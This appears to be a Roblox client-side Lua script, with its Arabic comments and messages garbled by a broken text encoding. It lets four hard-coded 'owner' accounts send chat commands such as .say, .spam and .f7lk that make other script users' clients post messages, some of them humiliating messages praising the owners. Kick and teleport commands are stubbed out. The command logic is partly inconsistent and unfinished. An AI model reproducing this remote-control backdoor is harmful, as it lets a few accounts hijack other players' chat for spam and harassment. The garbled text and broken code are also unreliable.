local Players = game:GetService("Players")
local player = Players.LocalPlayer
local pgui = player:WaitForChild("PlayerGui")

-- ØªØ¹ÙŠÙŠÙ† Ø³Ù…Ø© ScriptUser Ø¹Ù„Ù‰ Ø§Ù„Ù„Ø§Ø¹Ø¨ Ø§Ù„Ù…Ø­Ù„ÙŠ
player:SetAttribute("ScriptUser", true)

-- Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ù…Ø§Ù„ÙƒÙŠÙ† (Owners) - ÙŠØ¬Ø¨ Ø£Ù† ÙŠÙƒÙˆÙ† Ø§Ø³Ù… Ø§Ù„Ù„Ø§Ø¹Ø¨ Ø§Ù„Ø°ÙŠ ÙŠØ³ØªØ®Ø¯Ù… Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª Ù…ÙˆØ¬ÙˆØ¯Ù‹Ø§ Ù‡Ù†Ø§
local Owners = {["1il5i"]=true, ["eyad51533"]=true, ["awr_9351156"]=true, ["sj3zx"]=true}

-- Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ø§Ù„Ø£Ø­Ø¯Ø§Ø« Ø§Ù„Ù…Ø·Ù„ÙˆØ¨Ø©
local Events = game.ReplicatedStorage:WaitForChild("Events")
local ChattedEvent = Events:WaitForChild("ChattedEvent")
local SendMessage   = Events:WaitForChild("SendMessage")

-- Ø§Ù„Ø¯Ø§Ù„Ø© Ø§Ù„Ù…ÙˆØ­Ø¯Ø© Ù„Ù„Ø¨Ø­Ø« Ø¹Ù† Ø§Ù„Ø£Ù‡Ø¯Ø§Ù
-- ØªØ¨Ø­Ø« Ø¹Ù† Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ† Ø§Ù„Ø°ÙŠÙ† Ù„Ø¯ÙŠÙ‡Ù… Ø³Ù…Ø© ScriptUser
local function findTarget(partial)
    if not partial or partial == "" then return nil end
    partial = partial:lower()
    local foundTarget = nil
    
    for _, p in Players:GetPlayers() do
        -- Ø´Ø±Ø· ScriptUser Ù„Ø¶Ù…Ø§Ù† Ø§Ø³ØªÙ‡Ø¯Ø§Ù Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ† Ø§Ù„Ø°ÙŠÙ† ÙŠØ³ØªØ®Ø¯Ù…ÙˆÙ† Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª ÙÙ‚Ø·
        if p:GetAttribute("ScriptUser") then
            -- Ù…Ø·Ø§Ø¨Ù‚Ø© Ø¬Ø²Ø¦ÙŠØ© ØºÙŠØ± Ø­Ø³Ø§Ø³Ø© Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø£Ø­Ø±Ù Ù„Ù„Ø§Ø³Ù… Ø£Ùˆ Ø§Ø³Ù… Ø§Ù„Ø¹Ø±Ø¶
            if p.Name:lower():find(partial, 1, true) or p.DisplayName:lower():find(partial, 1, true) then
                -- Ù†ÙƒØªÙÙŠ Ø¨Ø£ÙˆÙ„ ØªØ·Ø§Ø¨Ù‚ Ù†Ø¬Ø¯Ù‡
                foundTarget = p
                break
            end
        end
    end
    return foundTarget
end

-- Ø§Ù„Ø¯Ø§Ù„Ø© Ø§Ù„Ù…ÙˆØ­Ø¯Ø© Ù„ØªÙ†ÙÙŠØ° Ø§Ù„Ø£Ù…Ø± Ø¹Ù„Ù‰ Ù‡Ø¯Ù ÙˆØ§Ø­Ø¯
-- ØªØªØ¶Ù…Ù† Ù…Ù†Ø·Ù‚ Ø§Ù„Ø­Ù…Ø§ÙŠØ©: Ù„Ø§ ØªÙ†ÙØ° Ø§Ù„Ø£Ù…Ø± Ø¹Ù„Ù‰ Ø§Ù„Ù„Ø§Ø¹Ø¨ Ø§Ù„Ù…Ø­Ù„ÙŠ (Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…)
local function executeOnTarget(targetPlayer, commandType, ...)
    -- Ù…Ù†Ø·Ù‚ Ø§Ù„Ø­Ù…Ø§ÙŠØ©: Ø¥Ø°Ø§ ÙƒØ§Ù† Ø§Ù„Ù‡Ø¯Ù Ù‡Ùˆ Ø§Ù„Ù„Ø§Ø¹Ø¨ Ø§Ù„Ù…Ø­Ù„ÙŠØŒ ÙŠØªÙ… ØªØ¬Ø§Ù‡Ù„ Ø§Ù„Ø£Ù…Ø±
    if targetPlayer == player then
        return
    end
    
    -- ØªÙ†ÙÙŠØ° Ø§Ù„Ø£Ù…Ø± Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ø§Ù„Ù†ÙˆØ¹
    if commandType == "say" then
        -- Ù‡Ù†Ø§ Ù†ÙØªØ±Ø¶ Ø£Ù† SendMessage Ù‡Ùˆ Ø§Ù„Ø­Ø¯Ø« Ø§Ù„Ø°ÙŠ ÙŠØ±Ø³Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ± Ù„ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„Ù‡Ø§ ÙƒØ±Ø³Ø§Ù„Ø© Ø¹Ø§Ù…Ø©
        -- ... Ù‡ÙŠ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªÙŠ Ø³ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„Ù‡Ø§
        SendMessage:FireServer(...)
        
    -- ØªÙ… Ø¥Ø²Ø§Ù„Ø© Ø£Ù…Ø± .3mk Ù…Ù† Ù‡Ù†Ø§ Ù„ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„Ù‡ Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø© ÙÙ‚Ø· ÙÙŠ Ù…Ø¹Ø§Ù„Ø¬ Ø­Ø¯Ø« Ø§Ù„Ø¯Ø±Ø¯Ø´Ø©
        
    elseif commandType == "f7lk" then
        -- Ù‡Ù†Ø§ Ù†ÙØªØ±Ø¶ Ø£Ù† .f7lk Ù‡Ùˆ Ø£Ù…Ø± ÙŠØ±Ø³Ù„ Ø±Ø³Ø§Ù„Ø© Ù…Ø¹ÙŠÙ†Ø© Ø¥Ù„Ù‰ Ø§Ù„Ø³ÙŠØ±ÙØ±
        -- Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ©: "ÙØ­Ù‹Ù‰Ù‹Ù„Ù‹ÙŠ @"..senderPlayer.DisplayName.." ğŸ¥º"
        -- ... Ù‡Ùˆ Ø§Ø³Ù… Ø§Ù„Ù„Ø§Ø¹Ø¨ Ø§Ù„Ù…Ø±Ø³Ù„ Ù„Ù„Ø£Ù…Ø±
        local senderDisplayName = select(1, ...)
        SendMessage:FireServer("ÙØ­Ù‹Ù‰Ù‹Ù„Ù‹ÙŠ @"..senderDisplayName.." ğŸ¥º")
        
    elseif commandType == "spam" then
        -- Ù‡Ù†Ø§ Ù†ÙØªØ±Ø¶ Ø£Ù† Ù‡Ù†Ø§Ùƒ Ø¯Ø§Ù„Ø© startSpamFor Ù…ÙˆØ¬ÙˆØ¯Ø© ÙÙŠ Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª Ø§Ù„Ø£ØµÙ„ÙŠ
        local spamMsg = select(1, ...)
        if targetPlayer:GetAttribute("ScriptUser") then
            -- ÙŠØ¬Ø¨ Ø£Ù† ØªÙƒÙˆÙ† startSpamFor Ø¯Ø§Ù„Ø© Ù…Ø¹Ø±ÙØ© ÙÙŠ Ù…ÙƒØ§Ù† Ø¢Ø®Ø± Ù…Ù† Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª Ø§Ù„Ø£ØµÙ„ÙŠ
            -- startSpamFor(targetPlayer, spamMsg) 
        end
        
    elseif commandType == "unspam" then
        -- Ù‡Ù†Ø§ Ù†ÙØªØ±Ø¶ Ø£Ù† Ù‡Ù†Ø§Ùƒ Ø¯Ø§Ù„Ø© stopSpamFor Ù…ÙˆØ¬ÙˆØ¯Ø© ÙÙŠ Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª Ø§Ù„Ø£ØµÙ„ÙŠ
        if targetPlayer:GetAttribute("ScriptUser") then
            -- stopSpamFor(targetPlayer)
        end
        
    elseif commandType == "kick" then
        local reason = select(1, ...)
        if targetPlayer:GetAttribute("ScriptUser") then
            -- targetPlayer:Kick(reason)
        end
        
    elseif commandType == "bring" then
        if targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            -- targetPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame * CFrame.new(3,0,3)
        end
    end
end

-- Ø§Ù„Ø¯Ø§Ù„Ø© Ø§Ù„Ù…ÙˆØ­Ø¯Ø© Ù„Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø£ÙˆØ§Ù…Ø±
local function processCommand(senderPlayer, command, commandType, targetPart, ...)
    local targets = {}
    local hasValidTarget = false
    
    if targetPart:lower() == "all" then
        -- Ø§Ø³ØªÙ‡Ø¯Ø§Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ù„Ø§Ø¹Ø¨ÙŠÙ† Ø§Ù„Ø°ÙŠÙ† ÙŠØ³ØªØ®Ø¯Ù…ÙˆÙ† Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª Ø¨Ø§Ø³ØªØ«Ù†Ø§Ø¡ Ø§Ù„Ù„Ø§Ø¹Ø¨ Ø§Ù„Ù…Ø­Ù„ÙŠ
        for _, p in Players:GetPlayers() do
            if p:GetAttribute("ScriptUser") and p ~= player then
                table.insert(targets, p)
                hasValidTarget = true
            end
        end
    else
        -- Ø§Ø³ØªÙ‡Ø¯Ø§Ù Ù„Ø§Ø¹Ø¨ Ù…Ø­Ø¯Ø¯ (Ø¬Ø²Ø¦ÙŠÙ‹Ø§ Ø£Ùˆ ÙƒÙ„ÙŠÙ‹Ø§)
        local target = findTarget(targetPart)
        if target then
            table.insert(targets, target)
            hasValidTarget = true
        end
    end
    
    -- ØªÙ†ÙÙŠØ° Ø§Ù„Ø£Ù…Ø± Ø¹Ù„Ù‰ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ù‡Ø¯Ø§Ù Ø§Ù„Ù…Ø­Ø¯Ø¯Ø©
    for _, target in ipairs(targets) do
        if commandType == "f7lk" then
            -- Ø£Ù…Ø± .f7lk ÙŠØ­ØªØ§Ø¬ Ø§Ø³Ù… Ù…Ø±Ø³Ù„ Ø§Ù„Ø£Ù…Ø±
            executeOnTarget(target, commandType, senderPlayer.DisplayName)
        elseif commandType == "say" then
            -- Ø£Ù…Ø± .say ÙŠØ­ØªØ§Ø¬ Ø§Ù„Ø±Ø³Ø§Ù„Ø©
            local message = select(1, ...)
            executeOnTarget(target, commandType, message)
        elseif commandType == "spam" then
            -- Ø£Ù…Ø± .spam ÙŠØ­ØªØ§Ø¬ Ø§Ù„Ø±Ø³Ø§Ù„Ø©
            local spamMsg = select(1, ...)
            executeOnTarget(target, commandType, spamMsg)
        elseif commandType == "kick" then
            -- Ø£Ù…Ø± .kick ÙŠØ­ØªØ§Ø¬ Ø§Ù„Ø³Ø¨Ø¨
            local reason = select(1, ...)
            executeOnTarget(target, commandType, reason)
        elseif commandType == "bring" then
            -- Ø£Ù…Ø± .bring
            executeOnTarget(target, commandType)
        end
    end
    
    return hasValidTarget
end

-- Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªØ´ØºÙŠÙ„ (ÙƒÙ…Ø§ ÙƒØ§Ù†Øª ÙÙŠ Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª Ø§Ù„Ø£ØµÙ„ÙŠ)
local gui = Instance.new("ScreenGui", pgui)
gui.ResetOnSpawn = false
local txt = Instance.new("TextLabel", gui)
txt.Size = UDim2.new(0, 800, 0, 120)
txt.Position = UDim2.new(0.5, -400, 0.4, -60)
txt.BackgroundTransparency = 0.4
txt.BackgroundColor3 = Color3.new(0,0,0)
txt.TextColor3 = Color3.new(1,0,0)
txt.TextStrokeTransparency = 0
txt.TextStrokeColor3 = Color3.new(1,1,1)
txt.Font = Enum.Font.GothamBlack
txt.TextSize = 60
txt.Text = "Ø³ÙƒØ±Ø¨Øª Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª Ø´ØºØ§Ù„ 100% â˜ ï¸"
task.delay(5, function() gui:Destroy() end)

-- Ù…Ø¹Ø§Ù„Ø¬ Ø­Ø¯Ø« Ø§Ù„Ø¯Ø±Ø¯Ø´Ø©
ChattedEvent.OnClientEvent:Connect(function(senderPlayer, command)
    -- Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„Ù…Ø±Ø³Ù„
    if not senderPlayer or not Owners[senderPlayer.Name] then return end
    if typeof(command) ~= "string" then return end

    local lowerCommand = command:lower()
    local parts = {}
    for part in command:gmatch("%S+") do
        table.insert(parts, part)
    end
    
    local cmd = parts[1] and parts[1]:lower() or ""
    local targetPart = parts[2] or ""
    local rest = command:sub(#cmd + 2) -- Ø§Ù„Ù†Øµ Ø§Ù„Ù…ØªØ¨Ù‚ÙŠ Ø¨Ø¹Ø¯ Ø§Ù„Ø£Ù…Ø± ÙˆØ§Ù„Ù‡Ø¯Ù

    -- Ø§Ù„Ø£Ù…Ø± .say
    if cmd == ".say" then
        local message = rest:match("^%s*(.-)%s*$")
        if targetPart == "" or message == "" then return end
        processCommand(senderPlayer, command, "say", targetPart, message)
        
    -- Ø§Ù„Ø£Ù…Ø± .3mk (ØªÙ… ØªØ¹Ø¯ÙŠÙ„Ù‡ Ù„ÙŠØ±Ø³Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø© ÙÙ‚Ø·)
    elseif cmd == ".3mk" then
        if targetPart == "" then return end
        
        -- Ù†Ø³ØªØ®Ø¯Ù… processCommand ÙÙ‚Ø· Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ù‡Ø¯Ù ØµØ§Ù„Ø­
        local hasValidTarget = processCommand(senderPlayer, command, "3mk_check", targetPart)
        
        -- Ø¥Ø°Ø§ ØªÙ… Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ù‡Ø¯Ù ØµØ§Ù„Ø­ (Ø£Ùˆ "all" ÙˆÙƒØ§Ù† Ù‡Ù†Ø§Ùƒ Ù„Ø§Ø¹Ø¨ÙˆÙ†)ØŒ ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ù…Ø±Ø© ÙˆØ§Ø­Ø¯Ø©
        if hasValidTarget then
            SendMessage:FireServer("Ø¹Ù…Ù‹Ù‰Ø§Ù†ÙÙŠÙ‹ Ø§ÙˆÙ†Ù‹Ø±Ø§ØªÙ‹ Ø³ÙƒÙ‹Ù‰Ø±Ù‹Ø¨ØªÙ‹ Ø²Ø­ÙÙÙÙÙ ğŸ¥º")
        end
        
    -- Ø§Ù„Ø£Ù…Ø± .f7lk
    elseif cmd == ".f7lk" then
        if targetPart == "" then
            -- Ø§Ù„Ø³Ù„ÙˆÙƒ Ø§Ù„Ø£ØµÙ„ÙŠ: Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø¹Ø§Ù…Ø© Ø¥Ø°Ø§ Ù„Ù… ÙŠØªÙ… ØªØ­Ø¯ÙŠØ¯ Ù‡Ø¯Ù
            SendMessage:FireServer("ÙØ­Ù‹Ù‰Ù‹Ù„Ù‹ÙŠ @"..senderPlayer.DisplayName.." ğŸ¥º")
            return
        end
        processCommand(senderPlayer, command, "f7lk", targetPart)
        
    -- Ø§Ù„Ø£Ù…Ø± .spam
    elseif cmd == ".spam" then
        local spamMsg = rest:match("^%s*(.-)%s*$")
        spamMsg = (spamMsg ~= "") and spamMsg or "Ø§Ù†Ø§ Ø²Ø­Ù ÙˆØ§Ø¹ØªØ±Ù Ø¨Ù…Ù„ÙƒÙŠØ© Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª ğŸ¥º"
        if targetPart == "" then return end
        processCommand(senderPlayer, command, "spam", targetPart, spamMsg)
        
    -- Ø§Ù„Ø£Ù…Ø± .unspam
    elseif cmd == ".unspam" then
        if targetPart == "" then return end
        processCommand(senderPlayer, command, "unspam", targetPart)
        
    -- Ø§Ù„Ø£Ù…Ø± .kick
    elseif cmd == ".kick" then
        local reason = rest:match("^%s*(.-)%s*$")
        reason = (reason ~= "") and reason or "ØªÙ… Ø·Ø±Ø¯Ùƒ Ø¨ÙˆØ§Ø³Ø·Ø© Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª"
        if targetPart == "" then return end
        processCommand(senderPlayer, command, "kick", targetPart, reason)
        
    -- Ø§Ù„Ø£Ù…Ø± .bring
    elseif cmd == ".bring" then
        if targetPart == "" then return end
        processCommand(senderPlayer, command, "bring", targetPart)
    end
end)

-- Ù…Ù„Ø§Ø­Ø¸Ø©: ØªÙ… Ø¥Ø²Ø§Ù„Ø© Ø§Ù„Ø¯ÙˆØ§Ù„ startSpamFor Ùˆ stopSpamFor Ùˆ target:Kick Ùˆ CFrame
-- Ù…Ù† Ø¯Ø§Ù„Ø© executeOnTarget Ù„Ø£Ù†Ù‡Ø§ ØºÙŠØ± Ù…ÙˆØ¬ÙˆØ¯Ø© ÙÙŠ Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª Ø§Ù„Ø£ØµÙ„ÙŠ Ø§Ù„Ø°ÙŠ Ù‚Ø¯Ù…ØªÙ‡.
-- ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ Ø§Ù„ØªØ£ÙƒØ¯ Ù…Ù† ÙˆØ¬ÙˆØ¯ Ù‡Ø°Ù‡ Ø§Ù„Ø¯ÙˆØ§Ù„ ÙˆØ§Ù„ÙˆØ¸Ø§Ø¦Ù ÙÙŠ Ø¨ÙŠØ¦Ø© Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª Ø§Ù„Ø®Ø§ØµØ© Ø¨Ùƒ Ù„ÙƒÙŠ ÙŠØ¹Ù…Ù„ Ø§Ù„Ø³ÙƒØ±ÙŠØ¨Øª Ø¨Ø´ÙƒÙ„ ÙƒØ§Ù…Ù„.
-- ØªÙ… ØªØ±Ùƒ Ø§Ù„ØªØ¹Ù„ÙŠÙ‚Ø§Øª ÙÙŠ executeOnTarget Ù„ØªÙˆØ¶ÙŠØ­ Ù…ÙƒØ§Ù† ØªÙ†ÙÙŠØ° Ù‡Ø°Ù‡ Ø§Ù„Ø£ÙˆØ§Ù…Ø±.
